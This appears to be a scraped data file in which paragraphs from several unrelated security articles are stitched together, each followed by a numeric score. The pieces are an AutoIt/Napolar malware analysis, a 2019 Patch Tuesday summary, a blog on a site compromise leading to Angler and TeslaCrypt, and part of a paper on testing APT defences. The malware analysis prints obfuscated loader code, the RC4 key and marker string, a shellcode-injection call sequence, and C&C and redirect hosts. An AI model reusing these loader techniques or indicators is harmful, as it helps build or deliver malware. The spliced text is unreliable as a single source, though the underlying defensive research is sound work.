Both IE_Explorer.exe (c72d5c35ea8aaa366b457e622ab235641c06376a) and Process.exe (14de27f59db24219073feb546f161a179d013dfd) are are standalone compiled AutoIT executables, with heavily obfuscated script content. They differ only in the embedded final payload; the AutoIt code is the same.
The AutoIT code builds and executes two shellcodes: an RC4 decoder and an injector. The first serves for decrypting the final executable payload, and the second injects the payload into a newly created process.
Most of the script commands are hidden behind EXECUTE(BINARYTOSTRING()) constructs. In this form, the AutoIt script instructions are stored in hexadecimal ASCII representation, which is first decoded to the command string, and then executed. For example, the decoder function is represented in the following form:
EXECUTE ( BINARYTOSTRING (  “0x2449664745575451676873545642626a732026204368722841736328537472696e674d6964202824506c736a6b646d48475
366684a6b736965772c2024692c20312929202b203929” ) )
This is converted by the BINARYTOSTRING() call to a more intuitive original form:
$IfGEWTQghsTVBbjs & Chr(Asc(StringMid ($PlsjkdmHGSfhJksiew, $i, 1)) + 9)
Finally, the EXECUTE() command runs it.
On top of that, string constants, along with the shellcode itself, are encoded by a simple shift-by-nine-bytes (or Caesar cypher, if you prefer fancy names), as seen from the decoder above, resulting in the incomprehensible form shown in Figure 7.
Figure 7. Encrypted shellcode and its decoder.
The final payload executable is RC4 encrypted and appended after the compressed script code in the AutoIt executable. A fragment of the RC4 decoder shellcode is shown in Figure 8.
Figure 8. RC4 decoder shellcode implementation.
The malware uses the string ‘mauasdsADadADAudASJDUasdS7ADHadA765asd’ as the start and end marker of the RC4 encrypted data; in addition, this string also serves as the decryption key.
This RC4 implementation is not an original development, it was taken straight from the source: https://code.google.com/p/autoit-cn/source/browse/trunk/UserInclude/ACN_HASH.au3.
The decoded content is a Win32 executable, which is executed using a process injector shellcode, a snippet of which is shown in Figure 9.
Figure 9. Process injector shellcode invoked from the AutoIt script.
The shellcodes are started using a sequence of calls to the functions DllStrucSetData (to fill the procedure buffer) and DllCall (to execute the buffer by invoking CallWindowProcW):
DllStructSetData($sdssdsdeessddsss, 1, $injector_shell)
DllStructSetData($sdssdsdeessddseess, 1, $sdssdsdssddsss)
DllCall(“user32.dll”, “int”, “CallWindowProcW”, “ptr”, DllStructGetPtr($sdssdsdeessddsss), “wstr”, (@AutoItExe),
“ptr”, DllStructGetPtr($sdssdsdeessddseess), “int”, 0, “int”, 0)",0.013758976083597663
"This method of project injection is discussed in [5] – an idea by reasen, an infamous AutoIt malware author. The attribution to this author is reflected in the embedded project path stored in the compiled executable: ‘ C:\Users\reasen\Desktop\’.
One of the common tools used for compiling AutoIt scripts into standalone executables is AutoIt3Wrapper [6]. This offers several directives to fine-tune the final executable. One of the directives is #AutoIt3Wrapper_Ico, which allows a custom icon to be used for the standalone executable. This directive was used to change the icon of the malicious executables into one resembling that of the OpenOffice suite. An interesting fact for us is that the script in the compiled executable contains all of the wrapper directives – including the full path of the custom icon. This may give us information about the username of the person who compiled the executable.
The code shows some similarity with reasencrypt [7].
reasen: A well-known AutoIt malware creator, most of whose appearances are on Spanish sites.
Also uses the name: Reasen Elbereth.
http://reasenelbereth.blogspot.com.es/
https://twitter.com/Reasen0 http://www.slideshare.net/TheReasen
Allegedly also coded by reasen: http://www.grendelcrypter.com/contact-us.html
There is no evidence to suggest that reasen is directly involved in this campaign; the other samples show stronger attributions to different people. It is more likely that he sold the AutoIt cryptor to the authors of this malware – or equally likely that the malware authors just took a sample created by reasen, and replaced the encrypted content. This can easily be done, as only the binary content needs to be regenerated using the known RC4 key, then the content between the start and end marker needs to be replaced by the encrypted content. In this case, the embedded payload was added to the EXE after the compilation.",0.01150988234922079
"Crypsola.exe
The AutoIt script in the Crypsola.exe sample (37f6e5ba7ed966228e79036698419a78a9583b62) features less obfuscation than the previous sample, using only the EXECUTE(BINARYTOSTRING()) trick – there is no additional encoding on top of it.
Interestingly, this script checks if the avastui.exe process is running. If the process is running, the script waits for 25 seconds, and then continues with the execution. This may be an attempt to abuse a timing issue in the Avast anti malware product; this trick has also been observed in other AutoIt malware [8].
The script commands are concatenated to strings byte by byte in a lengthy way, as shown in Figure 10.
Figure 10. String building.
(Click here to view a larger version of Figure 10.)
A less commonly used feature is the fact that standalone AutoIt executables are also archives that can contain further embedded files apart from the scripts themselves – in our case, an embedded text file. The latter is dropped to %TEMP%\deepweb.txt with the script command:
FILEINSTALL ( “f.txt” , @TEMPDIR & “\deepweb.txt” , 1 )
This line of code has two effects. When the malware author compiled the EXE, the content of the file f.txt was embedded into the final executable. During execution, this embedded content is saved to the file deepweb.txt in the temporary directory. The file contains an ASCII representation of the payload EXE.
Figure 11. Payload executable stored in ASCII representation.
The AutoIt script decodes it, and using the same injector shellcode as the other sample, executes it.
Unlike the samples in the previous section, this one does not use AutoIt3Wrapper. However, it is still possible to extract the project path from the compiled executable. The compiled executable contains encrypted metadata, one field of which is seemingly the full path of a temporary file, which also reveals the username: C:\Users\Johntab\AppData\Local\Temp\aut451B.tmp. The importance of this is that the username matches the one found earlier among the properties of the dropper Word documents – which indicates that this class of the AutoIt payload was created by the same user (and likely on the same computer) as the Word carrier documents.",0.01349675260529537
"Crypsoliar.exe
The Crypsoliar.exe sample (ece7650ad323706c3a3dfcfe539a25ded53ab3e7) is a medley of the previous two. It uses a shift by-two encryption of strings on top of the EXECUTE(BINARYTOSTRING()) trick, and the files are dropped using FileInstall. Junk string variable assignments are inserted into the code in the following form:
$KFXAFMBTBJ7463539079213644 = “SXdMCxnwLc18682537269213644”
$APJXYJBAUV8426698989213644 = “hhojVVnDEo19645697179213644”
LOCAL $MLFJUEIDLE = EXECUTE ( BINARYTOSTRING ( FHVNVLTILJTHBER ( “.v224a4a3152505341522150434/52430600405752433`000.040.0.2047
4c4/50572a434c06023/52562331274d3/3042070.04003b0007” ) ) )
$PAUVSHBGNI9389858899213644 = “wrAHosOjXb20608857089213644”
$EKFSLEBMHU10353018809213644 = “MckeIpOQqn97180529213644”",0.008236100762077703
"In this case, not one but two files are dropped into the temporary directory:
FILEINSTALL ( “kFxaFMBTbjgn9675177345409009.txt” , @TEMPDIR & “\f.txt” , 1 )
FILEINSTALL ( “ns.bin” , @TEMPDIR & “\ns.txt” , 1 )",0.0126577907915153
"Both files are decrypted using a custom decoder shellcode and then executed. The file f.txt decodes to the Napolar payload, and ns.txt decodes to a Rebhip (SpyRat) variant – a backdoor trojan written in Delphi.
The project path stored in the sample is exactly the same as in the previous sample: C:\Users\Johntab\AppData\Local\Temp\, indicating that it comes from the same author as the previous one.",0.011232033190933133
"Payload: Napolar
In all cases, the final payload of the infection campaign was a Napolar/Polarbot variant, as described in detail in [1]. Since the scope of this article is the distribution and installation of the malware, rather than the final payload, I will not describe Napolar in detail, only point out a few interesting things about it.
The executable features a couple of advanced anti-analysis tricks:
It has only one PE section, named ‘%*s%*s%s’. This crashes analysis tools, such as studPe and OllyDbg (using the format string vulnerability documented in [9]).
The executable is further obfuscated – the code section is encrypted, with the entry point set to an invalid value (0).
Figure 12. Napolar anti-reversing trick: spooky section name and 0 entry point.
The decoding and execution is achieved via two predefined TlsCallback functions. This makes it possible for Napolar to decrypt itself and execute even if no valid entry point is set – as described in [1].
The encryption algorithm is RC4, the key is 0xDEADBEEF. The decryption code is address independent, with an unusual load address (0xFE0000), as shown in Figure 13.
Figure 13. Address-independent RCA decoder in TlsCallback.
(Click here to view a larger version of Figure 13.)
The decoded content is injected into the explorer.exe process, which causes an additional obstacle in the debugging process: once the injection is complete, debugging to the explorer process may cause the computer to crash.
The trojan uses named pipes for inter-process communication. In the samples we have identified as belonging to this campaign, the names were a little (but only a little) different from the commonly reported \\.\pipe\napSolar:
\\.pipe\npSolar
\\.pipe\napSolar
The following C&C servers were contacted by the samples in this campaign:
dopline.ru
terra-araucania.cl
kasvatus.org.",0.012184052986811245
"Conclusion
This infection campaign reminds us once again that social engineering can be as effective as any code based exploitation. After all, exploitable versions of an application can be found with a lot less probability than socially engineerable users – the latter being installed in front of 90+% of computers.
Malware authors continue to surprise me over and over again. This time they surprised me not with the technical depth this piece of malware reached (average tasks accomplished), or its originality (proof of concept codes pasted in from multiple sources), but with the unusual selection of tools used. A VBA macro injects and runs a shellcode, then later on an AutoIt script injects and executes a shellcode. These are the two programming languages least likely to be named in the same paragraph as the word ‘shellcodes’.
I await the next move with anticipation – which, logically, can’t be anything other than the deployment of QuickBasic in targeted attacks.",0.009836196698094213
"Bibliography
[1] Xu, H. Solarbot botnet. Virus Bulletin, March 2014, p.12. http://www.virusbtn.com/virusbulletin/archive/2014/03/vb201403-Solarbot.
[2] Szappanos, G. Advanced Persistent Threats – the new normal? Naked Security. http://nakedsecurity.sophos.com/advanced-persistent-threats-the-new-normal/.
[3] Weeks, M. Direct shellcode execution in MS Office macros. http://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/.
[4] Stevens, D. Excel Exercises in Style. http://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/.
[5] http://foro.udtools.net/archive/index.php/t-10570.html.
[6] AutoIt3Wrapper. http://www.autoitscript.com/autoit3/scite/docs/AutoIt3Wrapper.html.
[7] Metasploit. https://www.youtube.com/watch?v=BAcQ7PR4FUw.
[8] boot.sx (Betabot http botnet hosted by worldstream.nl). http://www.exposedbotnets.com/2013/12/bootsx-betabot-http-botnet-hosted-by.html.
[9] OllyDbg Section Name Crash. http://forum.tuts4you.com/topic/28650-ollydbg-section-name-crash/.
",0.015088120179910902
"What you need to know for Patch Tuesday, March 2019",0.010345100933031981
"Written by
SophosLabs Offensive Security",0.008622298185940958
"March 14, 2019",0.008611937096437039
SophosLabs Uncut CVE Exploit Microsoft Patch tuesday Update upgrade vulnerability Windows,0.006792923340576684
"Microsoft released their monthly security updates for March this past Tuesday. This month’s fixes address 64 vulnerabilities that affect Windows and a range of software that runs on Windows, mainly the Internet Explorer and Edge browsers. In addition, there was a patch released for one critical vulnerability in Adobe Flash.
Among the 64 vulnerabilities in Microsoft products, 18 are categorized by Microsoft as critical, 45 as important, 1 as moderate and 1 as low this month. Almost all of the critical vulnerabilities allow an attacker to execute remote code on the targeted system, while one can be used to elevate privileges on the infected machine. Through a successful social engineering attack (either with a malicious website or Office documents), an external attacker could fully compromise a targeted user’s machine.
There are seven critical vulnerabilities for Edge, two for Internet Explorer, one remote code injection in MS XML, and the rest are for Windows components such as VBScript engine, DHCP Client, ActiveX or the TFTP Server. Even is classified as important and not critical, the two vulnerabilities affecting Win32k have been exploited in the wild.
Let’s have a closer look at some of the interesting vulnerabilities.
CVE-2019-0797, CVE-2019-0808 Win32k Elevation of Privilege
The Win32k driver is affected by a race condition that could allow an attacker to achieve elevation of privilege on a Windows 7 64bit machine. There is also a NULL page dereference issue that could also be used to achieve elevation of privilege but on a Windows 32bit machine, because the NULL page allocation is not allowed on 64bit systems and has been disabled by default since Windows 8. These two vulnerabilities have been spotted in the wild.
CVE-2019-0755, CVE-2019-0767, CVE-2019-0775 Windows Kernel Information Disclosure
These vulnerabilities can be used to read kernel memory and potentially reveal kernel pointers, which can be used to bypass Kernel Address Space Layout Randomization (KASLR). The first one uses the Windows API function NtQueryInformationFile to get information about a handle. In the returned information, there is a kernel pointer.
CVE-2019-0703 Windows SMB Information Disclosure
The NtQueryInformationFile function can be used on named pipe through SMB. Therefore a remote attacker could leverage that vulnerability to get kernel pointer from the targeted system.
Scripting Engine Memory Corruption
CVE-2019-0592, CVE-2019-0609, CVE-2019-0639, CVE-2019-0680, CVE-2019-0769, CVE-2019-0770, CVE-2019-0771, CVE-2019-0773, CVE-2019-0783
The JavaScript engine of the Edge and Internet Explorer web browsers, have multiple type confusion, use after free and out of bound write vulnerabilities that could lead a remote attacker, through a malicious website, to gain control of the targeted Windows 10 machine. The vulnerabilities have not been spotted exploited in the wild yet.
CVE-2019-0612 Microsoft Edge Security Feature Bypass
Normally for a Flash application to run, when the website is not in a whitelist provided by Microsoft, the user has to manually click on the plugin to activate it and run the application. In Microsoft Edge, it is possible to bypass such restriction and automatically run any Flash application from any domain.
CVE-2019-0665, CVE-2019-0666, CVE-2019-0667 Windows VBScript Engine Remote Code Execution
The Windows VBScript engine, that can be invoked from Internet Explorer is affected by a buffer overrun and a couple use after free vulnerabilities that could lead a remote attacker, through a malicious website, to gain control of the targeted Windows 10 machine. The vulnerabilities have not been spotted exploited in the wild yet.
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.016011433962403343
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2019-0592
Exp/20190592-A
9000836
N/V",0.010509710772930059
"CVE-2019-0609
Exp/20190609-A
9000837
N/V",0.011022796955726388
"CVE-2019-0680
Exp/20190680-A
9000842
N/V",0.01137474982007547
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
Additional IPS Signatures",0.015969978003995133
CVE,0.015603552773460372
Signature,0.009205760138433772
"CVE-2019-0612
9000838",0.009182093482070441
"CVE-2019-0639
9000839",0.009281701766814643
"CVE-2019-0665
9000840",0.008990150952800313
"CVE-2019-0666
46554",0.008939232913146244
"CVE-2019-0667
9000841",0.009455536208855198
"CVE-2019-0763
36991",0.009305285518577344
"CVE-2019-0767
9000843",0.009712700864702661
"CVE-2019-0768
9000844",0.009719633039032893
"CVE-2019-0769
2200885",0.009152594946557513
"CVE-2019-0770
9000845",0.00912858806643213
"CVE-2019-0771
9000846",0.009696144509937055
"CVE-2019-0773
9000847",0.009869178154093716
"What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.011427794767576605
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
MissMalini Celebrity Site Awards Admedia Gate & Angler Exploit Kit during the Oscars,0.010997130601996585
"On 29/FEB/16 Forcepoint researchers saw that the popular entertainment news site missmalini[.]com was compromised and redirecting to a malicious web site. The timing coincides with awards ceremonies such as The Oscars, so users are likely to be searching for celebrity news. The infection chain we analysed resulted in our system being silently exploited by Angler Exploit Kit (EK). The Teslacrypt crypto-ransomware was then dropped and executed on our test machine.  Forcepoint Security Labs notified the operators of the site once the compromise was confirmed and a draft of this report was provided. As of 09:49GMT 29/FEB/16, the compromise was still present.
Compromised Website
Missmalini[.]com is a self described ""Bollywood news, celebrity gossip, fashion trends, beauty tips and lifestyle updates!"" website. It receives an estimated 7.2 million visitors per month according to SimilarWeb.",0.014721263741863111
"fig 1. SimilarWeb statistics for missmalini[.]com
The website has been injected with javascript that automatically and silently browses to a malicious web site in the background.",0.011199508196984787
"fig 2. Injected code on missmalini[.]com
The website we saw loaded in the background was the following URL:",0.00699435882565691
"hxxp://img.zolotcevasunya[.]info/hellomylittlepiggy/?jQggZWnTPJtMp=gAixEdSiFMHYhElxLcU&hFpNGfviJOZs=bykiLOqaYQlSmHRwhejyj&DOFHXpX=cIfohhrRpuYfb&XgqKFGCuXARWUVVxr=MZTGPvWCwmnqZEyQ&tZprAiulNaaCjek=VBXgafKYOYFDocwOfplos&SIIsYhpimaCf=DQGxuqwrGJ&KfqJfnObwOpo=YMgmmXsd&keyword=225f169e667efdc8475dc2b36c9f62b1
These URLs are known as ""admedia"" gates and previously used URL paths like ""/admedia/"" and ""/megaadvertize/"". The latest incarnation seems to be using ""/hellomylittlepiggy/"". These sites act as a traffic direction system (TDS), deciding whether or not to send the user on to further malicious sites or not. The decision is typically based on the user's IP address and browser user-agent. For example, Internet Explorer and previously unseen IP addresses are of interest, whereas Google Chrome and IPs seen before are not.
Angler Exploit Kit & Teslacrypt Ransomware
The admedia TDS we saw during our analysis redirected us to Angler EK. This is a very prevalent EK which we have blogged about on multiple occasions. During our analysis, Adobe Flash Player vulnerability CVE-2015-8651 was exploited by Angler. As a result, a malware known as Teslacrypt was dropped and executed on our system. The sample we were sent can be found on VirusTotal:
https://www.virustotal.com/en/file/920773395b02916f5a02d68d3b3d9b6873d025fba57c7e351c211a6314aba869/analysis/
Teslacrypt is a crypto-ransomware that is similar to Locky and CryptoWall. It will encrypt documents found on the system and request a payment in order to get the files back. It will also continuously terminate any processes matching the following partial strings:",0.011035724122621882
"askmgr
rocex
egedi
sconfi
cmd
This means that the user cannot run Task Manager, Process Explorer, Regedit, System Configuration Utility (msconfig) or Command Prompt. This makes it very difficult for a standard user to terminate the malware and prevent it from encrypting the file system.
Summary
Angler EK shows no signs of relenting and is still very prevalent. Actors are aware of world events and continue to compromise websites of currently significant popularity. The use of crypto-ransomware also continues to persist, providing criminals with quick and easy financial gain.
Protection Statement
Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:",0.01282938534789746
Stage 2 (Lure) - The injected javascript on missmalini[.]com is identified and access to this site is blocked in real-time.,0.011643317960420618
"Stage 3 (Redirect) - The malicious redirect site (TDS) is detected and blocked.
Stage 4 (Exploit Kit) - The Angler EK pages are identified and prevented from exploiting the user's browser.
Stage 6 (Backchannel Traffic) - Attempts by Teslacrypt to contact its command-and-control servers are detected and blocked.",0.017945747954394742
"Indiciators of Compromise (IoCs)
Compromised Website
missmalini[.]com
Malicious TDS
js.zolotcekatya[.]info
Angler Exploit Kit
les.foodallergy[.]life
Blog contributors: Nick Griffin, Andy Settle
",0.013707764208900741
"VB2015 paper: Effectively testing APT defences: defining threats, addressing objections to testing, and suggesting some practical approaches
2016-01-29",0.013372727532628637
"Simon P.G. Edwards
Dennis Technology Labs
,
UK",0.010538480597271138
"Richard Ford
Florida Institute of Technology
,
USA",0.008937340320190779
"Gabor Szappanos
Sophos
,
Hungary
Editor:
Martijn",0.00906241388508322
"Grooten
Abstract
As targeted attacks gain more attention, and protection developers pay more attention to the implementation of new defensive technologies, the need arises for the testing of product efficacy with respect to this new kind of threat. However, compared with general product testing, APTs present additional challenges for the testers. In their VB2015 paper, Simon Edwards, Richard Ford and Gabor Szappanos ask if APT protection can be tested, and if so, whether it can be done practically.
Copyright © 2016 Virus Bulletin",0.012771797451092137
"Abstract
Anyone watching the cybersecurity marketplace will have noticed a rapid rise in products that claim to provide protection against ‘Advanced Persistent Threats’ (APTs). As targeted attacks gain more attention, and protection developers pay more attention to the implementation of new defensive technologies, the need arises for the testing of product efficacy with respect to this new kind of threat. However, compared with general product testing, APTs present additional challenges for the testers. In this presentation, we ask if APT protection can be tested, and if so, whether it can be done practically.",0.015243136751856401
"1. Introduction
In this paper, we address some of the challenges related to the testing of APT protection software suites and devices. Our arguments are essentially threefold. We first look at the subjective and confused range of definitions of what an APT even comprises.
We then look at some of the objections raised to testers’ measurements of APT protection efficacy in light of these definitions. Finally, we offer some simple guidelines for those who are attempting to construct or interpret tests of APT protection.
Our conclusion is that, while the entire APT space suffers at the hands of definitional uncertainty, there is a workable way forward for tests that measure different aspects of APT protection. With sufficient effort, tests can measure end-to-end protection. Such tests are ambitious but, given the importance and cost of both potential APT breaches and APT defences, a more scientific approach must be taken.",0.013937127725299203
"2. What is an APT?
Although the term ‘APT’ is used commonly nowadays, there is no generally accepted definition for it, and this contributes greatly to the problem of testing.
In part, the APT has become this year’s buzzword, but vendors, reviewers and users employ the term differently depending on circumstance and goal. Such definitional challenges only add to the confusion.
For example, TechTarget uses the following definition:
‘An advanced persistent threat (APT) is a network attack in which an unauthorized person gains access to a network and stays there undetected for a long period of time.’ [1]
According to this definition the sample must be undetected to be an APT. If a product detects a threat, then it is not an APT.
This leads us to the inevitable outcome that the only valid outcome of a test of APT protection is that nothing is detected (otherwise the test sample is not an APT).
While this definition therefore significantly simplifies APT testing in general, it would make APT testing a very simple (non-existent) task so we should aim for a more practical one. Here are a few more definitions that are quite interesting:
Wikipedia:
‘APT is a set of stealthy and continuous computer hacking processes, often orchestrated by human(s) targeting a specific entity. APT usually targets organizations and/or nations for business or political motives. APT processes require a high degree of covertness over a long period of time.’ [2]
NSS Labs:
NSS Labs adopts an alternative acronym for a targeted attack, referring to a Targeted Persistent Attack (TPA).
‘Targeted: The attacker selected the organization, for a specific reason.
Persistent: The attack is capable of using multiple command-and-control channels and attack vectors, and constantly increasing its penetration of your IT systems and resources. It is also stubborn, resisting remediation attempts.
Attack: While the word ‘threat’ is somewhat nebulous when used in the context of APT, there is nothing unclear about it here. This is a true attack, and it may have several distinct stages.’ [3]
Gartner:
‘Advanced threat – any attack that gets past your existing defences.
Persistent threat – any successful attack that goes undetected and continues to cause damage.
Advanced persistent threat – any attack that gets past your existing defences, goes undetected and continues to cause damage.’ [4]
The problem with these definitions is, once again, that they attribute being undetected to being a core feature of an APT. This definition renders APT defences and tests useless. Other definitions focus on other aspects:
RSA:
‘An Advanced Persistent Threat (APT) is a targeted attack against a high-value asset or a physical system.’ [5]
While this is a useful definition that makes it easy to determine if an attack belongs to this category, it does not explain the significance of the ‘Advanced’ and ‘Persistent’ attributes of an APT.
Damballa:
‘Advanced Persistent Threats (APTs) are a cybercrime category directed at business and political targets. APTs require a high degree of stealithiness [sic] over a prolonged duration of operation in order to be successful…
Advanced – Criminal operators behind the threat utilize the full spectrum of computer intrusion technologies and techniques…
Persistent – Criminal operators give priority to a specific task, rather than opportunistically seeking immediate financial gain… Threat – means that there is a level of coordinated human involvement in the attack, rather than a mindless and automated piece of code…’ [6]
We have a lot of definitions that attempt to define APT on an abstract level, hardly helping testers to categorize test scenarios. Our best option at this point is to change scope and deal with a better defined and more practical definition of targeted attacks along the lines of the RSA definition.
The terms ‘APT’ and ‘targeted attack’ are often used synonymously by the press and the APT protection providers so it makes sense to stick to the easily definable ‘targeted attack’ cases in test scenarios.
For practical purposes of testing we will define targeted attacks as follows:
A targeted attack is an infection scenario executed against a limited and pre-selected set of high-value assets or physical systems with the explicit purpose of data exfiltration or damage.",0.022230385502369998
"3. What does an APT attack look like?
Given that we know now what an APT is for all practical purposes, we have still to explore what such a targeted attack might look like.
According to Mandiant [7], an APT attack is more of a campaign than a single event, which follows the following rough outline:
Reconnaissance – prior to performing the attack, information is gathered that is used as part of the social engineering repertoire during the later stages.
Initial compromise – performed by use of social engineering and spear phishing, over email and/or by planting malware on a website that the victim employees are likely to visit.
Establish foothold – plant remote administration software in the victim’s network to create network backdoors and tunnels allowing stealth access to its infrastructure.
Escalate privileges – use exploits and password cracking to acquire administrator privileges over the victim’s computer and possibly expand it to Windows domain administrator accounts.
Internal reconnaissance – collect information on the surrounding infrastructure, trust relationships and Windows domain structure.
Move laterally – expand control to other workstations, servers and infrastructure elements and perform data harvesting on them.
Maintain presence – ensure continued control over access channels and credentials acquired in previous steps.
Complete mission – exfiltration of stolen data from the victim’s network.",0.020908517579696806
"3.1 Practical example of a targeted attack scenario
For the illustration of a targeted attack workflow, we picked up an attack that exploited the popular word processing software Microsoft Word.
This attack scenario happens in many consecutive steps but does not involve some of the steps in the previous list (initial reconnaissance, lateral movement). Regardless, it gives a good technical overview of what happens in the background on an attacked system.
Phishing email: The malware is delivered in email.
Exploited document: The email attachment is a .DOC document that exploits multiple Microsoft Office vulnerabilities. It was generated by the Microsoft Word Intruder exploit generator toolkit.
Upon opening the document, one of the vulnerabilities is triggered (depending on the patch state of the system) and the ‘shellcode’ that is embedded in the document is executed.
Shellcode: Although each of the vulnerabilities (CVE-2012-0158, CVE-2013-3906 and CVE-2014-1761) has an exploit block and a separate shellcode, they all do the same thing (see Figure 1).
Figure 1. Multiple vulnerabilities exist in the same document.
The shellcode searches for the embedded payload code in the memory, brute-forcing through all readable memory pages. If this embedded code is found, it decrypts and executes the payload, which is encrypted with a simple one-byte XOR algorithm.
To make the encryption key less obvious, the 0 bytes and the key bytes are left intact. If it was not done this way then the large blocks of zero bytes that are normally present in PE files would convert to the value of the key byte and simply looking in the file for a large block of similar bytes would reveal the encryption key.
Downloader code: The decrypted payload code is not a Windows trojan. Instead, it is another piece of shellcode that downloads the final payload component. The shellcode then connects back to the C&C server and downloads and executes the required component from there (see Figure 2).
Figure 2. Download of the main trojan.
Connect-back code: In parallel to the exploitation and the downloading process the malicious document connects back to a C&C server to report the infection attempt. This way the attackers can keep track of the targeted computer, even if the infection is not ultimately successful (see Figure 3).
Figure 3. C&C connect-back.
Final payload: The final payload is a keylogger trojan that collects keystrokes and harvests user account credentials from the gathered data. Clipboard content is also copied. The stolen data is uploaded to the attacker’s FTP server (see Figure 4).
Figure 4. Exfiltrated credentials.
Layered defences against targeted attacks: The attack described above has multiple steps. A modern anti-malware solution typically features several modules that utilize different detection approaches to provide a multi-layered diverse solution. This makes it more difficult for malware to bypass defences.
These modules could include the following:
Application control: blocks the execution of potentially unwanted/unauthorized applications
Anti-spam: blocks bulk email
Scanner: specific detection for known malware; generic detection for new malware
Firewall: blocks outbound communication attempts and inbound attacks
IPS: Intrusion Prevention System packet-level filtering of network traffic
URL filtering: reputation or blacklist-based blocking of website addresses
DLP: Data Loss Prevention software prevents exfiltration of sensitive data
Exploit protection: detects exploitation of application vulnerabilities
Behavioural-based detection: detects malware based on runtime activities in the system.
These different methods provide defence in depth against targeted attack scenarios, giving opportunities to detect and block the scenario at multiple points. In the example detailed earlier, the different modules can block the scenario at several points, as illustrated in Figure 5.
Figure 5. Different security modules can block the scenario at several points.
Any test that uses only a subset of the aforementioned detection capabilities is incomplete and, as such, does not give a full picture of the protection capabilities of the assessed solution.
As an example, in a test in which only the VirusTotal detection result of the final payload binary is used, several of the multi-layered defence modules are ignored. This is illustrated with dimmed layers in Figure 6.
Figure 6. Ignore multiple defence layers and risk an incomplete test.
Thus, testing end-to-end protection is critical if a broader view of product efficacy is to be gained.",0.024662718289528374
"4. Objections to APT testing
There are a number of reasons why vendors of anti-APT products may object to testers evaluating them. There are public statements criticizing tests in the press, and earlier in this paper we explored some definitions of APTs that clearly show vendors, analysts and others having very different opinions on what an APT actually is.
If testers and vendors can’t agree on what products are supposed to do, then this brings a major obstacle to testing. Here are some reasons why vendors may object to testers evaluating their products:
Historic skepticism about security testing/testers in general.
The APT detection/protection market is young and very sensitive to test results.
Tests are too limited to provide useful results because they are not based on what is happening in the ‘real world’.
Claims that products are not testable because a realistic test requires:
defenders to react to alerts.
unknown malware/exploits.
malware/exploits that will always bypass other defensive technologies.",0.013187428893034814
4.1 Commentary,0.008823723174482323
"4.1.1 Security testing/testers are dishonest and/or incompetent
‘Testers know nothing about advanced threats, how enterprises manage their networks and are too focused on traditional anti-virus testing methods to be able to test anti-APT products properly.’
This theoretical objection to anti-APT product testing may be the result of a reflexive response to standard methods of testing anti-virus software and the reputation of well-known anti-virus testers.
Some who today work in anti-APT businesses used to work in the anti-virus industry, which is a notoriously small world. It is possible that these people may be prone to assuming (based on historic experience) that anti-virus products do nothing more than scanning files to generate signatures, which are then compared to white/blacklists.
This definition of anti-virus was probably in the mind of the Symantec employee when he told the Wall Street Journal in May 2014 that ‘anti-virus is dead’.
From a business perspective it also suits anti-APT businesses to define anti-virus as being mainly or wholly signature-based because they can then demonstrate that their more sophisticated product(s) provide better protection.
Former anti-virus people probably remember the dissatisfaction there is/was with anti-virus tests that simply scan files rather than executing them or, even better, downloading them from live sources in real time. It took anti-malware testers a long time to update their methodologies, which damaged testers’ reputations in general and not just the reputations of the testers who refused to change. This damage may persist in the some minds.
If vendors assume that anti-virus means scanning files and comparing signatures, and that testers limit themselves to using on-demand scanning solely as a methodology, then it’s not surprising that they would object to such traditional and limited assessments of their sophisticated products. If vendors believe that testers are dishonest in representing the results then their objections seem even more reasonable.
However, today anti-virus products include a much wider set of protection features and many testers have adopted relevant testing methodologies to take these into account. Some also take very open approaches to disclosing methodologies and test data.
Of course, it may not suit anti-APT vendors to acknowledge this progress in the testing world because if they do, then tests gain credibility. Without credible test results vendors can make uncontested claims about products.",0.016600889806729913
"4.1.2 The anti-APT market is quite sensitive to test results
The advanced threat detection industry is relatively new, in terms of how it markets itself. In the following example we examine FireEye’s positioning and technology, but the same argument could be made for any number of new vendors in this space.
According to marketing material, FireEye offers what sounds like a novel proposition to detect or prevent advanced attacks. The vendor has apparently been successful in marketing its approach.
Whether or not FireEye’s combination of sandboxes and signature-based anti-virus scanners is very different to offerings from other security vendors doesn’t much matter currently because it is perceived by the market to be different.
FireEye makes a clear effort to differentiate itself from more ‘traditional’ companies and includes quotes on its website such as the following (with our emphasis):
‘FireEye is clearly the next generation of network security. Their unique signature-less technology is simply unmatched in detecting and blocking this new breed of advanced malware. (Director of security - global financial services company)’
The emphasized key phrases clearly show an effort to distinguish FireEye’s approach as being different from traditional anti-virus technology. The statements claim a lack of reliance on file signatures (even though the product actually includes an anti-virus scanner) and imply that there is a new type of malware that will always evade other solutions, in total contrast to FireEye’s solution.
At this early stage in the game positive test results would help these new companies build market share and stock price, while negative results are almost certain to damage the companies fast and hard. These ‘next-generation’ products are largely unproven and so are vulnerable to doubt from potential customers and investors. As such it may be better, from the vendors’ point of view, for there to be no tests running at all. As proposed above, a lack of results allows for uncontested marketing claims.
If tests exist that provide a vendor with results that they find acceptable for marketing purposes, then they may resist any evolution of testing procedures that could challenge their successful image. The winning vendor(s) may not care that those tests lack sophistication because their marketing objective (good results) is achieved.",0.019287635529901204
"4.1.3 Tests are not ‘real-world’
Anti-APT products are complex and involve monitoring real network traffic, servers and other endpoints for attacks. As such one might expect a realistic test to completely reproduce similar networks and attacks. This is unlikely to be feasible for even the most well-resourced testing organization.
That being the case, FireEye has concluded that testing is impossible and that the best solution is simply to buy its solution. FireEye CTO Dave Merkel told CRN that, ‘the best way to evaluate FireEye is for organizations to deploy our technology in their own environment and they will understand why we are the market leader in stopping advanced attacks.’
